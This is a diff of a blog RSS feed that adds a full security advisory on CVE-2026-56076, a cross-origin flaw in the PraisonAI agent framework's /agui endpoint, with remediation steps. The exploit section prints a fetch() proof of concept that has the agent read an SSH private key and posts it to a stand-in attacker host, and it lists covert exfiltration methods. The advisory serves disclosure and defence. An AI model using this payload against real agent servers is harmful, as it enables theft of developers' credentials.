@@ -1,2 +1,170 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PraisonAI on RockB</title><link>https://baeseokjae.github.io/tags/praisonai/</link><description>Recent content in PraisonAI on RockB</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 29 Jun 2026 18:40:39 +0000</lastBuildDate><atom:link href="https://baeseokjae.github.io/tags/praisonai/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2026-56076 — PraisonAI Cross-Origin Agent Execution Vulnerability Guide 2026</title><link>https://baeseokjae.github.io/posts/praisonai-cross-origin-agent-execution-vulnerability-guide-2026/</link><pubDate>Mon, 29 Jun 2026 18:40:39 +0000</pubDate><guid>https://baeseokjae.github.io/posts/praisonai-cross-origin-agent-execution-vulnerability-guide-2026/</guid><description>&lt;p&gt;Here&amp;rsquo;s a scenario I keep coming back to: you&amp;rsquo;re running PraisonAI locally to test a multi-agent workflow, you open a browser tab to check something on a forum, and within two seconds, a website you&amp;rsquo;ve never heard of has read your SSH private key, dumped your AWS credentials, and exfiltrated both to a server in another country. No pop-up, no redirect, no visible sign anything happened.&lt;/p&gt;
-&lt;p&gt;That&amp;rsquo;s CVE-2026-56076 in practice. It&amp;rsquo;s a cross-origin agent execution vulnerability in PraisonAI versions before 1.5.128, rated CVSS 8.6 (v4) / 8.1 (v3.1). The &lt;code&gt;POST /agui&lt;/code&gt; endpoint combines three failures — no authentication, hardcoded &lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt;, and Starlette&amp;rsquo;s Content-Type-agnostic JSON parsing — that lets any website a victim visits silently execute arbitrary agent commands and exfiltrate the results. I&amp;rsquo;ve been tracking the PraisonAI vulnerability landscape since the CVE-2026-44338 authentication bypass hit (exploited within 3 hours 44 minutes of disclosure), and this one scares me more because it bypasses every traditional network boundary. Your VPN, your firewall, your network ACLs — none of them matter when the attack comes from inside the browser.&lt;/p&gt;</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>PraisonAI on RockB</title><link>https://baeseokjae.github.io/tags/praisonai/</link><description>Recent content in PraisonAI on RockB</description><image><title>RockB</title><url>https://baeseokjae.github.io/images/og-default.png</url><link>https://baeseokjae.github.io/images/og-default.png</link></image><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 29 Jun 2026 18:40:39 +0000</lastBuildDate><atom:link href="https://baeseokjae.github.io/tags/praisonai/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2026-56076 — PraisonAI Cross-Origin Agent Execution Vulnerability Guide 2026</title><link>https://baeseokjae.github.io/posts/praisonai-cross-origin-agent-execution-vulnerability-guide-2026/</link><pubDate>Mon, 29 Jun 2026 18:40:39 +0000</pubDate><guid>https://baeseokjae.github.io/posts/praisonai-cross-origin-agent-execution-vulnerability-guide-2026/</guid><description>Complete guide to CVE-2026-56076: PraisonAI&amp;#39;s cross-origin agent execution vulnerability, attack mechanics, impact, and remediation.</description><content:encoded><![CDATA[<p>Here&rsquo;s a scenario I keep coming back to: you&rsquo;re running PraisonAI locally to test a multi-agent workflow, you open a browser tab to check something on a forum, and within two seconds, a website you&rsquo;ve never heard of has read your SSH private key, dumped your AWS credentials, and exfiltrated both to a server in another country. No pop-up, no redirect, no visible sign anything happened.</p>
+<p>That&rsquo;s CVE-2026-56076 in practice. It&rsquo;s a cross-origin agent execution vulnerability in PraisonAI versions before 1.5.128, rated CVSS 8.6 (v4) / 8.1 (v3.1). The <code>POST /agui</code> endpoint combines three failures — no authentication, hardcoded <code>Access-Control-Allow-Origin: *</code>, and Starlette&rsquo;s Content-Type-agnostic JSON parsing — that lets any website a victim visits silently execute arbitrary agent commands and exfiltrate the results. I&rsquo;ve been tracking the PraisonAI vulnerability landscape since the CVE-2026-44338 authentication bypass hit (exploited within 3 hours 44 minutes of disclosure), and this one scares me more because it bypasses every traditional network boundary. Your VPN, your firewall, your network ACLs — none of them matter when the attack comes from inside the browser.</p>
+<h2 id="what-makes-cve-2026-56076-different-from-other-agent-framework-vulnerabilities">What Makes CVE-2026-56076 Different from Other Agent Framework Vulnerabilities?</h2>
+<p>I&rsquo;ve written about <a href="/posts/crawl4ai-rce-sandbox-escape-guide-2026/">Crawl4AI&rsquo;s CVE-2026-53753 RCE</a> and the broader <a href="/posts/agentjacking-mitigation-guide-2026/">agentjacking attack surface</a>, but CVE-2026-56076 operates on a fundamentally different axis. Most agent framework exploits require network access to the server — you need to reach port 8000 from outside, or the server needs to be exposed to the internet. CVE-2026-56076 doesn&rsquo;t need any of that. The PraisonAI server can be bound to <code>127.0.0.1</code>, sitting behind a corporate VPN, with no public IP, and it&rsquo;s still fully exploitable. The victim&rsquo;s own browser becomes the attack vector.</p>
+<p>The vulnerability lives in <code>src/praisonai-agents/praisonaiagents/ui/agui/agui.py</code>, specifically the <code>POST /agui</code> handler. The class docstring says the AGUI server is intended for local development use — which is exactly why it&rsquo;s dangerous. Every developer running <code>praisonai agui</code> on their laptop while browsing the web is a target.</p>
+<h3 id="the-three-part-chain">The Three-Part Chain</h3>
+<p>CVE-2026-56076 isn&rsquo;t a single bug. It&rsquo;s three independent weaknesses that individually would be low-severity but together enable a complete cross-origin agent takeover:</p>
+<ol>
+<li>
+<p><strong>No authentication on <code>POST /agui</code></strong> — The endpoint accepts requests from any HTTP client. No API key, no bearer token, no session check, no CSRF protection. The handler calls <code>agent.run()</code> directly after deserializing the request body. Any client — browser JavaScript, curl, Postman — can trigger agent execution.</p>
+</li>
+<li>
+<p><strong>Hardcoded <code>Access-Control-Allow-Origin: *</code></strong> — Lines 131-141 of <code>agui.py</code> hardcode the wildcard CORS header on every response. Library consumers cannot override this without patching source code. There&rsquo;s no config option, no environment variable, no middleware hook. This tells browsers to permit cross-origin reads of the response body by JavaScript from any website.</p>
+</li>
+<li>
+<p><strong>CORS preflight bypass via Starlette&rsquo;s Content-Type-agnostic JSON parsing</strong> — This is the technical mechanism that makes the exploit work. The HTTP Fetch specification classifies POST requests with <code>Content-Type: text/plain</code> as &ldquo;simple requests&rdquo; — they bypass the CORS preflight <code>OPTIONS</code> handshake entirely. But Starlette&rsquo;s <code>Request.json()</code> (used by FastAPI for Pydantic body models) calls <code>json.loads(await self.body())</code> without verifying the <code>Content-Type</code> header is <code>application/json</code>. So a browser sends <code>Content-Type: text/plain</code> with a valid JSON body, FastAPI parses it as <code>RunAgentInput</code>, the agent executes, and the wildcard CORS header lets attacker JavaScript read the response. No preflight, no browser warning, no CORS violation.</p>
+</li>
+</ol>
+<table>
+  <thead>
+      <tr>
+          <th>Security Gap</th>
+          <th>What It Does</th>
+          <th>Why It Matters</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>No authentication</td>
+          <td>Any HTTP client can call <code>POST /agui</code></td>
+          <td>No barrier to entry for attackers</td>
+      </tr>
+      <tr>
+          <td><code>Access-Control-Allow-Origin: *</code></td>
+          <td>Permits cross-origin response reads</td>
+          <td>Browser JS can exfiltrate agent output</td>
+      </tr>
+      <tr>
+          <td>No Content-Type validation</td>
+          <td><code>text/plain</code> JSON still parsed</td>
+          <td>Bypasses CORS preflight entirely</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="how-the-attack-works--a-single-fetch-call">How the Attack Works — A Single fetch() Call</h2>
+<p>The exploit requires fewer than 10 lines of JavaScript. Here&rsquo;s the core:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://localhost:8000/agui&#34;</span>, {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;text/plain&#34;</span> },
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">query</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;read /home/user/.ssh/id_rsa&#34;</span> })
+</span></span><span style="display:flex;"><span>}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://attacker.example.com/exfil&#34;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>That&rsquo;s it. The browser sends this as a simple POST request — no preflight <code>OPTIONS</code> because <code>Content-Type: text/plain</code> is on the Fetch spec&rsquo;s simple-header allowlist. The PraisonAI AGUI endpoint receives it, Starlette parses the JSON body despite the <code>text/plain</code> Content-Type, the <code>RunAgentInput</code> model is deserialized, and <code>agent.run()</code> executes with the attacker&rsquo;s payload. The response — containing tool outputs, file contents, or command results — streams back with <code>Access-Control-Allow-Origin: *</code>, and the attacker&rsquo;s JavaScript reads every byte.</p>
+<p>The entire sequence completes in under two seconds. No visible browser indicator. No DevTools pop-up. No redirect.</p>
+<h3 id="exfiltration-techniques">Exfiltration Techniques</h3>
+<p>Once the attacker&rsquo;s JavaScript reads the agent response, they have multiple ways to get the data out:</p>
+<ul>
+<li><strong><code>fetch()</code> POST</strong> — Standard HTTP POST to attacker server. Visible in the Network tab if someone&rsquo;s watching.</li>
+<li><strong><code>new Image().src</code></strong> — GET request via image load URL. Low visibility, no XHR trace.</li>
+<li><strong><code>navigator.sendBeacon()</code></strong> — Background POST on page unload. Hard to detect, survives tab close.</li>
+<li><strong>DNS exfiltration</strong> — Encoded data in subdomain lookups. Very low visibility, bypasses content inspection.</li>
+</ul>
+<p>The attacker can chain multiple agent calls in sequence: read SSH keys in one request, read environment variables in another, list directory contents in a third, and exfiltrate each result as it arrives.</p>
+<h2 id="real-world-blast-radius">Real-World Blast Radius</h2>
+<p>The practical damage depends on what tools the PraisonAI agent instance has been configured with. In a typical development environment, that includes:</p>
+<ul>
+<li><strong>File read/write</strong> — Access to <code>~/.ssh/id_rsa</code>, <code>~/.aws/credentials</code>, <code>~/.config/gcloud/</code>, <code>~/.kube/config</code></li>
+<li><strong>Shell command execution</strong> — Arbitrary OS commands with the developer&rsquo;s privileges</li>
+<li><strong>API call capability</strong> — Internal services, cloud metadata endpoints (<code>http://169.254.169.254/</code>), databases</li>
+<li><strong>Code execution</strong> — Python eval, code generation and execution</li>
+<li><strong>Environment variable access</strong> — Cloud credentials, API keys, database passwords, SSH private keys</li>
+</ul>
+<p>A 2025 Cloud Security Alliance survey found that 74% of security professionals agree AI agents in their organizations routinely receive excessive access relative to operational requirements. CVE-2026-56076 weaponizes that excessive access through a vector most teams haven&rsquo;t considered: the developer&rsquo;s browser.</p>
+<h3 id="why-developer-machines-are-the-primary-target">Why Developer Machines Are the Primary Target</h3>
+<p>The AGUI endpoint is designed for local development. Its class docstring explicitly states the server is intended for local execution. This means the primary attack surface is developer workstations — the machines that already have the highest-value credentials and the broadest access to production systems. A developer running <code>praisonai agui</code> on their laptop while browsing the web creates a window for any website they visit to trigger agent execution.</p>
+<p>The attack works even if the developer&rsquo;s machine is behind a VPN or firewall, because the request originates from the developer&rsquo;s own browser to their own localhost. This is the same principle behind DNS rebinding and localhost CSRF attacks, but amplified by the agent&rsquo;s tool execution capabilities.</p>
+<h2 id="praisonais-vulnerability-pattern--this-isnt-an-isolated-incident">PraisonAI&rsquo;s Vulnerability Pattern — This Isn&rsquo;t an Isolated Incident</h2>
+<p>PraisonAI has accumulated 10+ CVEs in 2026, and the pattern is concerning. Every vulnerability follows the same theme: agent-execution endpoints exposed without authentication, with insufficient input validation, and with excessive default permissions.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Vulnerability</th>
+          <th>Type</th>
+          <th>CVSS v3</th>
+          <th>Exploitation Complexity</th>
+          <th>Time to First Exploit</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CVE-2026-56076</td>
+          <td>Cross-origin agent execution</td>
+          <td>8.1</td>
+          <td>Low (single fetch call)</td>
+          <td>Not yet publicly reported</td>
+      </tr>
+      <tr>
+          <td>CVE-2026-44338</td>
+          <td>Authentication bypass</td>
+          <td>7.3</td>
+          <td>Low</td>
+          <td>3h 44m</td>
+      </tr>
+      <tr>
+          <td>CVE-2026-34938</td>
+          <td>Sandbox escape → RCE</td>
+          <td>10.0</td>
+          <td>Medium</td>
+          <td>Not yet publicly reported</td>
+      </tr>
+      <tr>
+          <td>GHSA-fq2m-6wqh-x44g</td>
+          <td>Jobs API auth bypass</td>
+          <td>N/A</td>
+          <td>Low</td>
+          <td>Not yet publicly reported</td>
+      </tr>
+  </tbody>
+</table>
+<p>CVE-2026-44338 (authentication bypass in the legacy Flask <code>api_server.py</code>) saw automated exploitation within 3 hours 44 minutes of public disclosure — Sysdig reported scanners using the user-agent <code>CVE-Detector/1.0</code> probing exposed instances. CVE-2026-34938 (Python sandbox escape via <code>str</code> subclass <code>startswith()</code> override) earned a CVSS 10.0 — the maximum severity. CVE-2026-56076 is distinct because it requires no network access to the server, making it the lowest-friction exploit across all disclosed PraisonAI vulnerabilities.</p>
+<p>This pattern suggests an architectural gap in PraisonAI&rsquo;s security model rather than individual coding mistakes. The framework was designed for convenience — unauthenticated endpoints, permissive CORS, no input validation — and that convenience is the vulnerability. I&rsquo;ve seen this pattern before in the <a href="/posts/agent-skills-supply-chain-security-guide-2026/">agent skills supply chain security space</a>, where frameworks prioritize ease of use over security boundaries and the result is a systemic attack surface.</p>
+<h2 id="remediation--what-actually-works">Remediation — What Actually Works</h2>
+<h3 id="upgrade-to-15128-required">Upgrade to 1.5.128 (Required)</h3>
+<p>The primary fix is upgrading to PraisonAI version 1.5.128 or later, which removes the unauthenticated AGUI endpoint entirely. The <code>POST /agui</code> route no longer accepts requests without explicit authentication configuration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install praisonai&gt;<span style="color:#f92672">=</span>1.5.128
+</span></span><span style="display:flex;"><span>praisonai --version
+</span></span></code></pre></div><p>Verify the fix by testing that the endpoint rejects unauthenticated requests:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://localhost:8000/agui <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;: &#34;test&#34;}&#39;</span>
+</span></span></code></pre></div><p>This should return a 401 or 403 status, not a successful agent execution.</p>
+<h3 id="defense-in-depth-strongly-recommended">Defense-in-Depth (Strongly Recommended)</h3>
+<p>Given that PraisonAI has accumulated 10+ CVEs in 2026 spanning auth bypass, sandbox escape, path traversal, and code injection, upgrading alone isn&rsquo;t enough. Here&rsquo;s what I&rsquo;d add:</p>
+<p><strong>Content-Type validation middleware</strong> — Add a middleware that rejects requests where <code>Content-Type</code> is not <code>application/json</code> on the AGUI endpoint. This prevents the simple-request CORS bypass even if CORS headers are misconfigured again in the future.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> starlette.middleware.base <span style="color:#f92672">import</span> BaseHTTPMiddleware
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ContentTypeValidationMiddleware</span>(BaseHTTPMiddleware):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dispatch</span>(self, request, call_next):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>url<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/agui&#34;</span> <span style="color:#f92672">and</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>            content_type <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;content-type&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;application/json&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> content_type:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">from</span> starlette.responses <span style="color:#f92672">import</span> JSONResponse
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> JSONResponse(
+</span></span><span style="display:flex;"><span>                    {<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Content-Type must be application/json&#34;</span>},
+</span></span><span style="display:flex;"><span>                    status_code<span style="color:#f92672">=</span><span style="color:#ae81ff">415</span>
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">await</span> call_next(request)
+</span></span></code></pre></div><p><strong>Replace wildcard CORS</strong> — Never use <code>Access-Control-Allow-Origin: *</code> on endpoints that return sensitive data. Specify only trusted domains. If the endpoint is for local development only, use <code>Access-Control-Allow-Origin: http://localhost:3000</code> or similar.</p>
+<p><strong>Authenticate all agent-execution endpoints</strong> — API keys, bearer tokens, or mutual TLS. Authentication should be required by default, not an opt-in configuration.</p>
+<p><strong>Bind to localhost only</strong> — If you&rsquo;re running AGUI locally, bind the server to <code>127.0.0.1</code> only, not <code>0.0.0.0</code>. This prevents access from other machines on the network.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Start AGUI bound to localhost only</span>
+</span></span><span style="display:flex;"><span>praisonai agui --host 127.0.0.1
+</span></span></code></pre></div><p><strong>Consider containerization</strong> — Run AGUI inside a Docker container with a restricted network profile. No host network mode, no exposed ports to the host. This limits the blast radius if the endpoint is compromised.</p>
+<h2 id="the-bigger-picture--ai-agent-framework-security-in-2026">The Bigger Picture — AI Agent Framework Security in 2026</h2>
+<p>CVE-2026-56076 is a symptom of a broader problem in the AI agent framework ecosystem. The 3-hour-44-minute exploitation window for CVE-2026-44338 demonstrates that automated scanners monitoring CVE feeds and probing for vulnerable agent instances are already operational. The tooling ecosystem for agentic AI frameworks is increasingly targeted immediately after disclosure.</p>
+<p>What worries me most is that CVE-2026-56076 bypasses traditional network security boundaries entirely. The victim&rsquo;s browser becomes the attack vector, making VPNs, firewalls, and network ACLs completely irrelevant. The framework&rsquo;s own tooling — file readers, shell executors, API callers, code generators — gives attackers a built-in post-exploitation toolkit that requires no additional malware or payload delivery.</p>
+<p>If you&rsquo;re running any AI agent framework — PraisonAI, LangChain, CrewAI, AutoGen, or similar — audit your agent endpoints for the same vulnerability pattern: unauthenticated execution coupled with permissive CORS and permissive content-type parsing. The OWASP Top 10 for LLM Applications is a starting point, but it doesn&rsquo;t adequately cover the cross-origin attack surface unique to agent frameworks that execute tools autonomously.</p>
+<h2 id="frequently-asked-questions">Frequently Asked Questions</h2>
+<h3 id="does-cve-2026-56076-affect-all-praisonai-versions">Does CVE-2026-56076 affect all PraisonAI versions?</h3>
+<p>No. The vulnerability affects PraisonAI versions from 0 up to but not including 1.5.128. Version 1.5.128 and later remove the unauthenticated AGUI endpoint. If you&rsquo;re running 1.5.128 or newer, you&rsquo;re not affected by CVE-2026-56076 — but verify your CORS and authentication configuration anyway.</p>
+<h3 id="can-the-exploit-be-detected-by-the-victim">Can the exploit be detected by the victim?</h3>
+<p>Detection is extremely difficult. The attack produces no visible browser indicators — no pop-ups, no redirects, no UI changes. The <code>fetch()</code> call completes in under two seconds in the background. Network-level detection is possible if you monitor localhost HTTP traffic, but standard developer workflows don&rsquo;t include real-time monitoring of agent endpoint requests. Browser DevTools would show the request in the Network tab, but you&rsquo;d need to have DevTools open during the exploit window.</p>
+<h3 id="is-this-vulnerability-related-to-other-praisonai-cves">Is this vulnerability related to other PraisonAI CVEs?</h3>
+<p>CVE-2026-56076 shares the same root cause pattern as other PraisonAI vulnerabilities: agent-execution endpoints exposed without authentication. CVE-2026-44338 (CVSS 7.3) exposed the legacy Flask <code>api_server.py</code> with unauthenticated <code>POST /chat</code> and <code>GET /agents</code>. GHSA-fq2m-6wqh-x44g exposed the Jobs API with unauthenticated agent execution. CVE-2026-56076 adds the cross-origin exploitation angle through CORS misconfiguration. The pattern suggests an architectural gap in PraisonAI&rsquo;s security model rather than individual coding mistakes.</p>
+<h3 id="does-upgrading-to-15128-fully-protect-against-all-praisonai-attacks">Does upgrading to 1.5.128 fully protect against all PraisonAI attacks?</h3>
+<p>No. Upgrading fixes CVE-2026-56076 specifically, but PraisonAI has accumulated 10+ CVEs in 2026 across multiple attack surfaces. CVE-2026-34938 (sandbox escape, CVSS 10.0) and GHSA-fq2m-6wqh-x44g (Jobs API auth bypass) require separate fixes. Review the full PraisonAI security advisory list, implement defense-in-depth measures, and monitor for new advisories. The systemic pattern of vulnerabilities suggests future CVEs are likely.</p>
+<h3 id="what-should-i-do-if-i-find-a-vulnerable-praisonai-instance">What should I do if I find a vulnerable PraisonAI instance?</h3>
+<p>Restrict network access immediately by blocking port 8000 (or the configured AGUI port) at the firewall level. Verify whether the instance is running version 1.5.128 or later. If not, upgrade immediately and invalidate any credentials or secrets the agent may have had access to — API keys, cloud provider credentials, database passwords, SSH keys. Audit logs for any unauthorized agent execution requests. Report the finding to your security team and treat it as a confirmed compromise of the affected system.</p>
+]]></content:encoded></item></channel></rss>
